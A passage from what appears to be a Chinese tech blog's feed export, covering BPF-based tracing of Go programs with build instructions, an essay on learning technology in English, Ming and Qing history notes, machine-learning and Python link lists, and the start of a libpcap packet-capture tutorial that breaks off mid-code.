1, fmt.Println (a=...) at ../../../src/libgo/go/fmt/print.go:263263 ../../../src/libgo/go/fmt/print.go: No such file or directory.(gdb) p a$1 = &#123;__values = 0xc208000240, __count = 1, __capacity = 1&#125;(gdb) p a.__values$18 = (struct &#123;...&#125; *) 0xc208000240(gdb) p a.__values[0]$20 = &#123;__type_descriptor = 0x4037c0 &lt;__go_tdn_string&gt;, __object = 0xc208000210&#125;(gdb) x/s *0xc2080002100x403483: "Hello, BPF!" 五、Function Latency 示例：循环调用 fmt.Println() 函数的时延直方图（纳秒） WARNING: Go 函数调用过程中，如果从一个进程（goroutine）切换到另外一个系统进程，funclatency 无法匹配入口-返回。这种场景需要一个新的工具 —— gofunclatency ，它基于 Go 内建的 GOID 替代系统的 TID 追踪时延，在某些情况下， uretprobes 修改 Go 程序可能出现崩溃的问题，因此在调试之前需要准备周全的计划。 12345678910111213141516171819202122# funclatency 'go:fmt.Println'Tracing 1 functions for "go:fmt.Println"... Hit Ctrl-C to end.^CFunction = fmt.Println [3041] nsecs : count distribution 0 -&gt; 1 : 0 | | 2 -&gt; 3 : 0 | | 4 -&gt; 7 : 0 | | 8 -&gt; 15 : 0 | | 16 -&gt; 31 : 0 | | 32 -&gt; 63 : 0 | | 64 -&gt; 127 : 0 | | 128 -&gt; 255 : 0 | | 256 -&gt; 511 : 0 | | 512 -&gt; 1023 : 0 | | 1024 -&gt; 2047 : 0 | | 2048 -&gt; 4095 : 0 | | 4096 -&gt; 8191 : 0 | | 8192 -&gt; 16383 : 27 |****************************************| 16384 -&gt; 32767 : 3 |**** |Detaching... 六、总结原作者总结很简洁，不再赘述。 I took a quick look at Golang with dynamic tracing and Linux enhanced BPF, via bcc’s funccount and trace tools, with some successes and some challenges. Counting function calls works already. Tracing function arguments when compiled with gccgo also works, whereas Go’s gc compiler doesn’t follow the standard ABI calling convention, so the tools need to be updated to support this. As a proof of concept I modified the bcc trace tool to show it could be done, but that feature needs to be coded properly and integrated. Processing interface objects will also be a challenge, and multi-return values, again, areas where we can improve the tools to make this easier, as well as add macros to C for writing other custom Go observability tools as well. 七、Tips6.1 安装和编译 BCC123456789101112git clone https://github.com/iovisor/bcc.gitmkdir bcc/build; cd bcc/buildcmake -DCMAKE_INSTALL_PREFIX=/usr \ -DLUAJIT_INCLUDE_DIR=`pkg-config --variable=includedir luajit` \ # for lua support ..makesudo make installcmake -DPYTHON_CMD=python3 .. # build python3 bindingpushd src/python/makesudo make installpopd 6.2 构建 LLVM 和 Clang 开发工具库1234567891011121314151617181920yum install gccyum install gcc-g++wget https://cmake.org/files/v3.9/cmake-3.9.0-rc4.tar.gztar -xvf cmake-3.9.0-rc4.tar.gzcd cmake-3.9.0./bootstrap gmakegmake installexport CMAKE_ROOT=/usr/local/share/cmake-3.9.0export PATH=$PATH:$CMAKE_ROOTgit clone http://llvm.org/git/llvm.gitcd llvm/tools;git clone http://llvm.org/git/clang.gitcd ..; mkdir -p build/install; cd buildcmake -G "Unix Makefiles" -DLLVM_TARGETS_TO_BUILD="BPF;X86" -DCMAKE_BUILD_TYPE=Release -DCMAKE_INSTALL_PREFIX=$PWD/install ..makemake installexport PATH=$PWD/install/bin:$PATH 6.3 LLVM 与 ClangLLVM （Low Level Virtual Machine）是一种编译器基础设施，以C++写成。起源于2000年伊利诺伊大学厄巴纳-香槟分校维克拉姆·艾夫（Vikram Adve）与克里斯·拉特纳（Chris Lattner）的研究，他们想要为所有静态及动态语言创造出动态的编译技术。2005年，Apple直接雇用了克里斯·拉特纳及他的团队，为了苹果电脑开发应用程序，期间克里斯·拉特纳设计发明了 Swift 语言，LLVM 成为 Mac OS X 及 iOS 开发工具的一部分。LLVM 的范围早已经不局限于创建一个虚拟机，成为了众多编译工具及低级工具技术的统称，适用于LLVM下的所有项目，包含LLVM中介码（LLVM IR）、LLVM除错工具、LLVM C++标准库等。 目前 LLVM 已支持包括ActionScript、Ada、D语言、Fortran、GLSL、Haskell、Java字节码、Objective-C、Swift、Python、Ruby、Rust、Scala1以及C#等语言。 Clang 是LLVM编译器工具集的前端（front-end），目的是输出代码对应的抽象语法树（Abstract Syntax Tree, AST），并将代码编译成LLVM Bitcode。接着在后端（back-end）使用 LLVM 编译成平台相关的机器语言 。Clang支持C、C++、Objective C。它的目标是提供一个 GCC 的替代品。作者是克里斯·拉特纳（Chris Lattner），在苹果公司的赞助支持下进行开发。Clang项目包括Clang前端和Clang静态分析器等。 6.4 ABI应用二进制接口（Application Binary Interface， ABI）描述了应用程序和操作系统之间或其他应用程序的低级接口。ABI涵盖了各种细节，如： 数据类型的大小、布局; 调用约定（控制着函数的参数如何传送以及如何接受返回值），例如，是所有的参数都通过栈传递，还是部分参数通过寄存器传递；哪个寄存器用于哪个函数参数；通过栈传递的第一个函数参数是最先push到栈上还是最后； 目标文件的二进制格式、程序库等等。 ABI vs API应用程序接口 (API)定义了源代码和库之间的接口，因此同样的代码可以在支持这个API的任何系统中编译，然而ABI允许编译好的目标代码在使用兼容 ABI 的系统中无需改动就能运行。 扩展阅读：动态追踪技术 操作系统原理 | How Linux Works（一）：How the Linux Kernel Boots 操作系统原理 | How Linux Works（二）：User Space &amp; RAM 操作系统原理 | How Linux Works（三）：Memory 动态追踪技术(一)：DTrace 导论 动态追踪技术(二)：strace+gdb 溯源 Nginx 内存溢出异常 动态追踪技术(三)：Tracing Your Kernel Function! 动态追踪技术(四)：基于 Linux bcc/BPF 实现 Go 程序动态追踪 动态追踪技术(五)：Welcome DTrace for Linux 参考文献 Linux MySQL Slow Query Tracing with bcc/BPF | Brendan Gregg’s Blog Notes on BPF &amp; eBPF | Julia Evans Probing the JVM with BPF/BCC | Sasha BPF: Tracing and more | Brendan Gregg SlideShare]]></content>
      <tags>
        <tag>DevOps</tag>
        <tag>Linux</tag>
        <tag>DTrace</tag>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[论工程师的自我修养：全英文技术学习实践]]></title>
    <url>%2F2017%2F06%2F27%2FTechnology-English%2F</url>
    <content type="text"><![CDATA[概要 全英文技术学习的必要性 如何实践全英文技术学习 一、搞一点翻译 二、精读原版教材 三、电子书必不可少 四、一切知识最后都要对应到人 五、善用效率工具，持续改进 总结：从input到output 引子2016年9月，上海GOPS大会现场。《Site Reliability Engineering》一书的作者之一、来自Google的Chris Jones在做分享, Chris说一句，他的前同事、中文版译者孙宇聪在一旁翻译一句。演讲人和翻译一句一顿，底下上千人坐着，像极了总理新闻发布会，场面一度尴尬。link 可是话说回来了，要是不翻译，估计现场80%以上的人还真就听不明白在说啥，公开活动毕竟要照顾大多数。 本篇文章接下来将结合挨踢行业的一些情况，严肃地讨论一下技术人员的语言能力问题，希望您读完以后能够有所触动、有所行动、有所裨益。 全英文技术学习的必要性现实一：中国英文教育的全面失败一般接受过小学教育的人都可以掌握中文，在日常生活中熟练应用：可以拿起一份报纸或者打开一个八卦网页看得津津有味。而反观我们的英文教育可以说是彻头彻尾的失败——投资巨大（据说很多城市中产阶级报的英语补习班，每学期学费约2.5万元）、旷日持久（完成本科教育也至少10几年吧），却少有人可以随便拿起一份英文报纸或者杂志看的津津有味。 本朝还有一大特色就是所谓的“专业英语”，几乎每个专业都安排了一个“XX专业英语”，列入课程、列入考试、列入职称评定等等。网上搜了一下，目前大概有100多种，实际效果如何呢？我想除了增加教材销售额，对相关从业人员的水平提高不会有什么用。 现实二：中文出版市场的怪象根据有关调查数据，国民人均阅读图书4.25本（加上电子书就有5.77本了）。下列国家每年人均阅读的数量是：韩国11本、法国20本、日本40本、芬兰47本，以色列64本。这个调查数字不是非常权威，但是可以在出版市场获得验证：虽然我们是一个13亿人的国家，一年出版的图书中接近70%属于服务考试的教材，全国一年中销售过百万册的文艺类畅销书也不到10种，专业技术书籍就只能算非常小众的市场了。相关数据和生活观察都可以发现，很多人在接受完基础教育之后，基本上就不再看书了。 以IT行业为例，一本普通的专业技术书籍，销量和利润大概是多少呢？保本：销售3000本以上畅销书：销售几万本以上大畅销书：销售几十万本以上超级畅销书：销售一百万本以上 对比文艺类书籍，专业书籍是垂直市场、受众人群少、销量小。大部分（50%以上）的IT书籍，销售量不超过3000本，只能刚刚弥补纸张、印刷、作者、编辑的成本，对出版社来说，毫无利润。 中文作者的报酬出版社给作者的版税是8%，现在一本书定价大约为50～100元，卖一本书作者到手4～8块，保本销售才到手12000～24000元，北上广稍微资深一点的码农月薪一般都比这个高，有写书的功夫还不都玩去了。翻译译者的报酬就更低了，已经十多年没有变了（耗时数月，斟酌字句：千字60元RMB)，所以技术书籍的译者，基本上是在为人民服务、跟做公益差不多。 中文出版市场恶性循环由此形成：需求畸形导致供应畸形，大部分人都去搞门槛低、利润高的考试教辅市场，其它作／译者能获得的报酬过低，报酬低又消灭高水平人士进入的热情，进一步限制了出版作品的质量，更没法吸引读者。 现状三：中文对学术的贡献度低如果前面两个问题还可以通过 国民教育改革 、知识产权制度建设 以及国内相关产业的技术提升而逐步改善，那么国人原创能力和动力不足的现实问题更加突出：互联网上有英语使用者9.5亿，中文网民7.6亿紧随其后，这个数量远远超过排名第三、只有2.9亿使用者的西班牙语网民。但是互联网的资讯数量，英语信息占到51.7%，紧随其后的俄语和日语信息，分别是6.5%和5.6%。中文排名一下子落到了第九位，只占整个互联网信息总量的2%，甚至还逊于2.5%的葡萄牙语、2.4%的意大利语。 上述数据显示：使用中文的人更喜欢浏览网络上的资讯，但对创作新的内容并不感兴趣。这一点亦可以在微信朋友圈上得到印证：大多数人习于转发，习惯于转述流行的热帖，而有一定创作能力或者说表达自己观点的人，可以说是凤毛麟角。 如何实践全英文技术学习了解上述三个现状，就可以发现这些问题都不是依靠几个宏伟命题、高喊几句口号可以在短期内根本改善的。那么作为一名有追求的工程师，该如何突破这些瓶颈，提高自己的长远竞争力呢？———— 全英文技术学习训练。接下来将我最近一段时间的训练总结如下，供各位读者交流、批判。 一、搞一点翻译关于全英文技术学习的思路，我是从业余翻译活动中获得的灵感。最早翻译的内容也不是技术方面，而是经济学人上面的文章：跟技术沾点边，又比较有趣的小短文。这样的文章，对于它的背景会比较熟悉，又不至于耗费太多精力，例如： Economist译文:事与愿违的后门程序 Economist译文:印度电商竞赛 体会到翻译的乐趣之后，我才开始寻找一些本专业的英文资料，翻译之后发在社区，取得了不错的反馈，例如： 《Stack Overflow: The Architecture - 2016 Edition》 动态追踪技术：Linux喜迎DTrace Linux之父：Just for Fun！ 翻译的过程其实就是对原文知识的再强化、再巩固的过程，译的过程中任何混淆不清的地方都需要反复揣摩、查阅第三方资料求证，直到译完之后就会发现，对比刚开始粗粗阅览的时候已经有了更深刻的理解。但是 搞一点翻译最重要的心得就是：翻译根本靠不住！ 我首先承认：由于水平有限，之前以及往后发布的翻译作品肯定会有错误、疏漏，或者不得已“模糊”处理的地方。有些东西实在很难找到合适的中文表达方式，或者说译者对于原文也会有不明白、理解错误的地方，自己尚且如此，何况其他译者乎？ 现实中很多人完全依赖翻译资料学习技术，这种侥幸心理实在过于乐观。 另外，据我所知国内有些技术Leader，都有 带领团队翻译书籍 的习惯。翻译是最适合团队合作的游戏之一，既能提高大家的学习能力、表达能力，又能训练团队密切协作，这是多Cool的事啊！以后有机会专门写篇讨论下。 二、精读原版教材对于计算机专业，或者对于经济、金融、卫生、法律、管理等专业来说也一样，本来中文语境下就没有这类专业，纯属舶来品，用英文去学习和理解反而更加简单。在大量的英文资料中，大致可以分为如下几类： 专业领域术语。最省事最高效的方法就是上维基百科把每个词都查一遍。 HandBook。 经典教材 经典论文。广义上还包括各种RFC文件 发明者的论述&amp;培训讲义 应用者的讨论与实践总结 实践应用。实践出真知，读完以上所有资料之后顶多算得到一些认识，要升华为自己掌握的知识，必须通过实践综合运用。 从经典的入门专业教材一本本开始读起，找自己专业教材对应的英文原版或者参考书刊的对应原版。 当时班上一哥们问我如何能过英语六级考试，我就建议他改看计算机类的原版教材，别再看中文教材了，这样本专业和英语两不误。结果后来他果然轻松过了六级，貌似考得比我还高呢。后来他逢人就夸我的法子好，哈哈！ ——— 章亦春 @agentzh 但是这招并不一定每个人都能接受，初试者开始可能很不适应，因为中英文教材的编写思路不太一样，例如知乎上有一个话题：为什么觉得英文原版教材很啰嗦？ 我们习惯的中文教材比较简明，上来肯定是先告诉你概念，接着进行解释阐述。英文教材的习惯则是“发现问题——思考问题——提出结论——引入话题”的次序，属于“由点到面”的思路。关于这个问题，我更喜欢引用机械工业出版社华章系列书中的《出版者的话》： 文艺复兴以降，源远流长的科学精神和逐步形成的学术规范，使西方国家在自然科学的各个领域取得了垄断性的优势，也正是这样的传统，使美国在信息技术发展的六十年间名家辈出、独领风骚。在商业化的进程中，美国的产业界和教育界越来越紧密地结合，计算机学科中的许多泰山北斗同时身处科研和教学的最前线，由此产生的经典科学著作，不仅擘划了研究的范畴，还揭示了学术的源变，既遵循学术规范，又自有学者个性，其价值并不会因年月的流逝而减退。 其要者无非有二：一者领先优势显著、独步天下，二者大佬辈出、产业和学术高度融合。具体案例就是，很多技术发明或者开源软件项目都是以学术论文的形式进入公众视野的。例如Hadoop项目的《MapReduce:Simplified Data Processing on Large Clusters》、《The Google File System》,Ganglia项目的《 The ganglia distributed monitoring system: design, implementation, and experience》。论文的可读性很强，能看到发明者设计初衷、实现原理甚至测试数据等。 三、电子书必不可少一本书从开始写作到最终出版，要经过很多环节。忽略掉写作过程，从交稿到出版会经历很多次审核和校对，可能会历时4-8个月，着这个过程中，很多东西都可能发生了变化。如果原版为英文版，等到翻译成中文再出版，书中的很大一部分内容可能已经过时。这种现状随着技术的更新速度和频率还会再加剧。 作为一种知识载体，电子书的重要性不言而喻。而且个人更加倾向于推荐在线版的电子书，例如GitBook。对作者而言，它没有任何的审核流程，没有出版门槛，也没有排版的时间消耗，只需要关注内容即可。于读者而言，它可以提供持续更新，可以在很大程度上降低读者的风险（快递费，等待时间等），也提供了读者和作者直接沟通的平台渠道。 四、一切知识最后都要对应到人 世界上少数专家的强大输出，贡献了绝大多数的优质学习资源。 例如，我对系统性能优化方面受益最多的来自于 Brendan Gregg，他维护的个人博客发布了大量的原创内容，出版了包括《性能之巅》在内的一大批书籍，囊括了性能问题领域的技术、工具、方法论等方方面面，并且持续保持着活跃的更新频率。又如kanban这一方法论，我很多年前就已经知道，但是一直不甚了了、未能实践，但是看过 Marcus Hammarberg 的视频《Kanban in Action》之后，一下子就有触类旁通的感觉，很快就能娴熟应用。 五、善用效率工具，持续改进千里之行，始于足下。上面提到的所有设想都需要行动才能转化为结果，这会是一个漫长而艰难的过程，既需要足够的耐心也需要一些工具和方法论的辅助：个人推荐GTD（Getting Things Done），它是一种行为管理的方法，其主要原则在于一个人需要通过记录的方式把头脑中的各种任务移出来。通过这样的方式，头脑可以不用塞满各种需要完成的事情，而集中精力在正在完成的事情。 “把所有事情都从你的脑袋里弄出来。在事情出现，而不是在事情爆发的时候,就做好相关行动的一系列决定。以合适的类别组织好你的项目的各种提醒以及下一步的行动。保持你的系统更新和完整，充分地检查，使你在任何时候都能信任你的对于你正在做（或者不做）的事情直觉的选择。” 一般过程：“搜集-处理-整理-行动-检查”。举例：将Twitter上发现的感兴趣内容发送到OmniFocus收件箱，整理分类并 设置一个要求完成时间 （最关键的要素，没有完成时间的计划都是耍流氓），定期检查待办事项完成情况，再开启下一轮调整优化。 总结：从input到output you can’t connect the dots looking forward; you can only connect them looking backwards.—- Steve Jobs 回到本文开头，关于国内开技术大会还需要现场翻译，我相信未来总有一天会通过技术进步来解决这个问题。面对技术的不断更新换代，持续学习能力才是增强竞争力的不二法门。获得知识的途径早已不限于各种专业技术书籍、同行经验交流，社区分享，博客，公众号，推特，电子书和在线视频等新载体层出不穷，突破语言瓶颈的要义在于提高交流学习的视野、借用天下资源为我所用，最终目的还是服务我们的实践活动。当我们的实践达到相当的深度和广度，自然可以通过早已建立的、世界范围的联系发挥影响力。 读者反馈 jianshu.com,@FallownDown:我觉得您说的很有道理，我也想通过看原版书来学英语，可是看得超慢，而且我的英语语法也不是很好，碰到长难句就搞不懂啥意思了，去网上搜翻译感觉翻译的很生硬，这个问题您有什么好的建议吗？Re:那就换一本。原版书也是有层次区分的，初试者可以从易到难，比如各种手册、Packet Guide，语法简明，不会有长难句。另外，很多内容看不懂很可能是相关领域的基础知识没掌握，不妨再看看别的。总之，无论学什么都要循序渐进。 参考文献 施一公：如何提高自己的专业英文文献阅读能力丨医麦精品汇 | 2018-03-12 施一公 医麦客 魏祢:不懂英语，造就了13亿人的信息孤岛 邱俊涛：技术人员如何写一本书 恶魔奶爸Sam:如何才能熟练阅读各类英文报刊 恶魔奶爸Sam:怎么解决专业英语的问题？ Joey Chen:我为什么鼓励工程师写Blog 搜狐新闻：中产教育鄙视链-绝不让娃和没英文名的孩子同读 热爱阅读的芬兰人 裁判文书网：北京中青文文化传媒有限公司与北京百度网讯科技有限公司侵害作品信息网络传播权纠纷申请再审民事裁定书 如何正确选择合适自己的英文学习方法和材料？原创 2016-06-07 恶魔奶爸 推荐两本语法练习册（选做）| 原创 2016-07-13 恶魔奶爸Sam 英语口语水平影响阅读英文资讯或者文学作品吗？| 原创 2016-09-18 恶魔奶爸Sam 恶魔奶爸Sam@英文词典知多少 学好英语的核心是写作｜BetterRead | 2016-07-25 金雯 BetterRead]]></content>
      <tags>
        <tag>最佳工程实践</tag>
        <tag>OpenSource</tag>
        <tag>DevOps</tag>
        <tag>网络协议</tag>
        <tag>Linux</tag>
        <tag>Developer</tag>
        <tag>SDN</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[明史：李自成]]></title>
    <url>%2F2017%2F06%2F25%2FMrLizicheng%2F</url>
    <content type="text"><![CDATA[摘要 小说《李自成》 一、小说《李自成》作者姚雪垠（yin 第二声），原名姚冠三，1910年10月10日出生于河南省南阳市邓州市一个破落地主家庭。（1910年10月10日~1999年4月29日） 社会评价从崇祯11年写起，全面地反映明末李自成起义由困厄转到兴盛，复由胜利走向失败这一历史悲剧的发展过程。第 1卷出版于1963年,第2卷出版于1976年,第3卷出版于1981年，最后两卷也已有若干单元(如《崇祯之死》、《李自成之死》)陆续发表。人物从帝王、后妃、百官到义军将领、战士、各类市民、穷苦百姓，乃至清方首领与文臣武将，地域从西北高原、中州重镇、北京城内到僻远山村、关外城池，场面从战地厮杀、牢狱交锋、密室定计、边寨平叛到宫廷宴饮、相府风光、京城灯市、军中婚礼，笔墨无不触及。 是一部规模宏大的悲剧性史诗。（引自百度百科） 个人体会第一次通读，通过kindle软件断断续续看了一个月时间（201604～201605，福州）。 史诗性上自庙堂，下至小民，无论是塞外形势，还是帝都市井，可以说把握得非常到位。我想这应该首先得益于作者丰富的人生经历，即身处于一个动荡不安的近现代中国，几乎就是明末清初的翻版。其对中国社会各阶层的洞察力，非一般书匠可以达到。 人性江山美人，千古风流。李自成占领北京的短暂时间里，大篇幅涉及“罗虎－费珍娥”的悲剧故事。李自成于罗虎，舐犊情深；于宫人，也能礼敬；于费宫娥，也算慷慨爱护。就私德而言，李不可谓不自制、不可谓不真、不可谓不富有人情味。可就是这样一个像珍惜自己的羽毛一样珍惜自己私德的好人，却极度缺乏领袖需要的大多数公德：首鼠两端、猜忌股肱、贪婪残暴、不舍得分享权力，即使占有半壁江山，却仍是个小吏心态。比之汉高祖、明太祖差了不是一两个段位。这也注定了大顺政权的悲剧，汉民族于变革之际，也只能勉强推出这样的领袖，真是千古大悲！ 庙算小说中军师宋献策的一段对白，深以为然，后来者不得不思之： “十日之后，安知粮船不移到别处？再如，倘若吴三桂幕中有人，事先向九门口增强守备，凭借天险截杀我方奇兵，我方就不能越出长城一步。还有种种变化，非可预料。臣以为用兵重在全盘谋划，知彼知己，不在某一妙计。全盘谋划就是古人所说的“庙算”。陛下天纵英明，熟读兵法，且有十余年统兵打仗阅历，在智谋上胜臣百倍。然悬军远征之事，却未见其可。”“吴三桂借他的一封家书，向孤挑战，倘不讨伐，必成大祸。捷轩已传令三军出征，军令如山。倘若临时变计，必会动摇军心，惹吴三桂对我轻视。”“望陛下从大处着眼，对吴三桂示以宽宏大量，以全力对付满洲，方不误‘庙算’决策！”“‘庙算’已经定了，东征之计不能更改，你不用说下去了！” 班子满清政权收集关内的情报工作制度： 在北京城内和近郊经常潜伏着各种细作，一有重要消息便送到满洲境内，再用专门备用的驿马一站一站地送到盛京。凡是紧急探报，到了兵部的主管部门，都得赶快炒出数份，分送睿亲王、郑亲王、兵部尚书、内三院大学士，所以凡是特别重大的军情消息，主要执政的王、公、大臣们很快就会知道。 成大事，非一人一智可为，必须有精干的班子，辅之以健全的支撑系统。]]></content>
      <tags>
        <tag>History</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于明史]]></title>
    <url>%2F2017%2F06%2F25%2FHistory-Ming%2F</url>
    <content type="text"><![CDATA[综合 （推荐）黄仁宇:《明代的漕运》 黄仁宇:《放宽历史的视界》 明初明中明晚 黄仁宇:《万历十五年》 明史：李自成 文艺作品 影视作品《大明王朝1956》：政府财政逻辑 小说《明朝那些事》 参考文献]]></content>
      <tags>
        <tag>History</tag>
        <tag>Economist</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于明史]]></title>
    <url>%2F2017%2F06%2F24%2FHistory-Qing%2F</url>
    <content type="text"><![CDATA[摘要 明清交际：李自成 康雍乾 嘉庆、道光、咸丰：太平天国、张集馨 同治、光绪：谭嗣同 明清交际 明史：李自成 康雍乾 红楼故事：佩刀沽酒作长歌 红楼故事：康熙的秘密情报系统 雍正《大义觉迷录》 史景迁|《康熙与曹寅》 孔飞力|《叫魂》 嘉庆、道光、咸丰史景迁：《太平天国》张集馨《时晴斋主人自叙年谱》 吏治：贿赂公行，政由贿出 刑狱：上下交通，枉法裁判 财政：巧立名目，巧取豪夺 军队：营制败坏，军纪荡然 背景：张集馨的个人生活 附录：张集馨的生平年表 中华书局1981年编辑出版 《道咸宦海见闻录》，作者：张集馨，（1800年－1879年），字椒云，别号时晴斋主人，江苏仪征人。道光咸丰年间历任翰林院、太原知府、道员，福建、陕甘、四川、河南、直隶、江西等省按察使、布政使、署理巡抚等职。 不同于一般大官僚自订或后人编述的年谱，多是连篇累牍自我吹嘘和阿谀谄媚之辞，该年谱主要为其任职其间所经历的官场人事浮沉、立以敏锐观察及看法之记录，记述详实但观点从己身出。张集馨翰林出身，擅长文墨、观察敏锐，其所处的时代正是清朝遭受内忧外患冲击至大之大动荡前期，张任职范围覆盖大江南北，更以一介文士多次出入幕府、统兵作战，阅历丰富，而且再加上几起几落，对于当时的政情吏治、世风民情，有较为清醒的认识。正如一个不具名的传抄者曾说：“这部书名为年谱，其实几乎等同于小说，对官场鬼蜮情形，刻画入微，不亚于清末之《官场现形记》、《二十年目睹之怪现状》”。 同治、光绪最后的豪侠：谭嗣同参考文献 清代职官资料库|台湾中央研究院历史语言研究所 新加坡清史研究网|Qing History Society (Singapore)]]></content>
      <tags>
        <tag>History</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[机器学习(Machine Learning)小组]]></title>
    <url>%2F2017%2F06%2F19%2FMachine-Learning%2F</url>
    <content type="text"><![CDATA[摘要机器学习是人工智能的一个分支。机器学习算法提供了一类从数据中自动分析获得规律，并利用规律对未知数据进行预测的方法。机器学习已广泛应用于数据挖掘、计算机视觉、自然语言处理、搜索引擎、医学诊断、证券市场分析、DNA 测序、战略游戏和机器人等诸多领域。 社区 简书专题 |《Machine Learning 小组》 我正在「Machine Learning」和朋友们讨论有趣的话题，你一起来吧？https://t.zsxq.com/zFUF2zv 机器学习导论 机器学习规则 (Rules of Machine Learning) 读书笔记|数学之美（Beauty Of Mathmetics） Simple EMail Demo | Plug &amp; Play Machine Learning Models in GoLang 数学工具：3Blue1Brown3Blue1Brown 是一个数学学习频道。其发布的视频通过动画演示和讲解，帮助观者在头脑中构建有关数学概念定义定理的最生动直观的理解，致力于将复杂得数学概念可视化。 Very Basic Intro to Neural Networks 机器学习应用Topic：机器学习与自然语言处理(Natural Language Processing) Domain Expert:Professor Michael CollinsProfessor of Computer Science,Columbia University Introduction to Probability, 2nd EditionISBN: 978-1-886529-23-6Publication: July 2008, 544 pages, hardcoverPrice: $91.00 Topic：机器学习与计算机图形/视觉处理 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning (二) : 宠物智能识别之 Using OpenCV with Node.js Topics Machine Learning Techniques Applied to Cyber Security Introducing Datalore - an intelligent web application for machine learning Frameworks Top 9 Frameworks in the World of Artificial Intelligence You can build a neural network in JavaScript even if you don’t really understand neural networks Research Stanford ML Group Stanford Deep Learning Tutorial Algorithm is gonna get you | All the buzz at AI’s big shindig | Machine learning’s big event 扩展阅读:《The Machine Learning Master》 Machine Learning(一):基于 TensorFlow 实现宠物血统智能识别 Machine Learning(二):宠物智能识别之 Using OpenCV with Node.js Machine Learning:机器学习项目 Machine Learning:机器学习算法 Machine Learning:如何选择机器学习算法 Machine Learning:神经网络基础 Machine Learning:机器学习书单 Machine Learning:人工智能媒体报道集 Machine Learning:机器学习技术与知识产权法 Machine Learning:经济学家谈人工智能 数据可视化（三）基于 Graphviz 实现程序化绘图 How 构建机器学习系统的20个经验教训 参考文献 浅谈人工智能：现状、任务、构架与统一 | 正本清源 | 原创 2017-11-02 朱松纯 视觉求索 统计建模与机器学习的区别喜欢 |作者 Oliver Schabenberger | 译者 NER 发布于 2016年7月20日 Alibaba’s social credit rating is a risky game | FT.com How Machine Learning is changing Software Development | Aki Ranin 美团外卖骑手背后的AI技术 | 何仁清 ·2018-03-29 19:40]]></content>
      <tags>
        <tag>架构师</tag>
        <tag>DevOps</tag>
        <tag>Developer</tag>
        <tag>Machine-Learning</tag>
        <tag>数学与算法</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[玩转编程语言:Python]]></title>
    <url>%2F2017%2F06%2F19%2FLanguage-Python-lang%2F</url>
    <content type="text"><![CDATA[摘要 ABC Learn By Example:Python Basics Application远程通信协议：从 CORBA 到 gRPC 一、远程调用技术简史:从 CORBA 到 gRPC 二、gRPC 简介 三、gRPC 示例代码 扩展阅读 玩转编程语言系列 参考文献算法https://www.analyticsvidhya.com/blog/2015/09/full-cheatsheet-machine-learning-algorithms/ Python基础http://datasciencefree.com/python.pdfhttps://www.datacamp.com/community/tutorials/python-data-science-cheat-sheet-basics#gs.0x1rxEA Numpyhttps://www.dataquest.io/blog/numpy-cheat-sheet/http://datasciencefree.com/numpy.pdfhttps://www.datacamp.com/community/blog/python-numpy-cheat-sheet#gs.Nw3V6CEhttps://github.com/donnemartin/data-science-ipython-notebooks/blob/master/numpy/numpy.ipynb Pandashttp://datasciencefree.com/pandas.pdfhttps://www.datacamp.com/community/blog/python-pandas-cheat-sheet#gs.S4P4T=Uhttps://github.com/donnemartin/data-science-ipython-notebooks/blob/master/pandas/pandas.ipynb Matplotlibhttps://www.datacamp.com/community/blog/python-matplotlib-cheat-sheethttps://github.com/donnemartin/data-science-ipython-notebooks/blob/master/matplotlib/matplotlib.ipynb Scikit Learnhttps://www.datacamp.com/community/blog/scikit-learn-cheat-sheet#gs.fZ2A1Jkhttp://peekaboo-vision.blogspot.de/2013/01/machine-learning-cheat-sheet-for-scikit.htmlhttps://github.com/rcompton/ml_cheat_sheet/blob/master/supervised_learning.ipynb TensorFlowhttps://github.com/aymericdamien/TensorFlow-Examples/blob/master/notebooks/1_Introduction/basic_operations.ipynb PyTorchhttps://github.com/bfortuner/pytorch-cheatsheet]]></content>
      <tags>
        <tag>Developer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网络数据包的捕获、过滤和分析（Packet Capturing）]]></title>
    <url>%2F2017%2F06%2F16%2FNetwork-Pcap%2F</url>
    <content type="text"><![CDATA[摘要 Packet Capturing Overview What is Packet Capturing How can it be used What is libpcap Debug Tools: tcpdump &amp; WinPcap &amp; snoop What is BPF What is gopacket What is Packet CapturingPacket capture is a computer networking term for intercepting a data packet that is crossing or moving over a specific computer network.Once a packet is captured, it is stored temporarily so that it can be analyzed. The packet is inspected to help diagnose and solve network problems and determine whether network security policies are being followed. How can it be used DevelopmentTesting &amp; validating &amp; Reverse engineer APP on API Network AdministrationSeeing what traffic goes on in background,Looking for malicious traffic on networkData capturing is used to identify security flaws and breaches by determining the point of intrusion. TroubleshootingManaged through data capturing, troubleshooting detects the occurrence of undesired events over a network and helps solve them. If the network administrator has full access to a network resource, he can access it remotely and troubleshoot any issues. Securitydefcon Wall of Sheep.Hackers can also use packet capturing techniques to steal data that is being transmitted over a network, like Stealing credentials.When data is stolen, the network administrator can retrieve the stolen or lost information easily using data capturing techniques. Forensicsforensics for crime investigations.Whenever viruses, worms or other intrusions are detected in computers, the network administrator determines the extent of the problem. After initial analysis, she may block some segments and network traffic in order to save historical information and network data. What is libpcap libpcap flow involving data copy from kernel to user space. 1234567891011121314151617//Compile with: gcc find_device.c -lpcap#include &lt;stdio.h&gt;#include &lt;pcap.h&gt;int main(int argc, char \*\*argv) &#123; char \*device; char error_buffer[PCAP_ERRBUF_SIZE]; //Find a device device = pcap_lookupdev(error_buffer); if (device == NULL) &#123; printf("Error finding device: %s\n", error_buffer); return 1; &#125; printf("Network device found: %s\n", device); return 0;&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849#include &lt;stdio.h&gt;#include &lt;time.h&gt;#include &lt;pcap.h&gt;#include &lt;netinet/in.h&gt;#include &lt;netinet/if_ether.h&gt;void print_packet_info(const u_char \*packet, struct pcap_pkthdr packet_header);int main(int argc, char \*argv[]) &#123; char \*device; char error_buffer[PCAP_ERRBUF_SIZE]; pcap_t *handle; const u_char *packet; struct pcap_pkthdr packet_header; int packet_count_limit = 1; int timeout_limit = 10000; /*In milliseconds*/ device = pcap_lookupdev(error_buffer); if (device == NULL) &#123; printf("Error finding device: 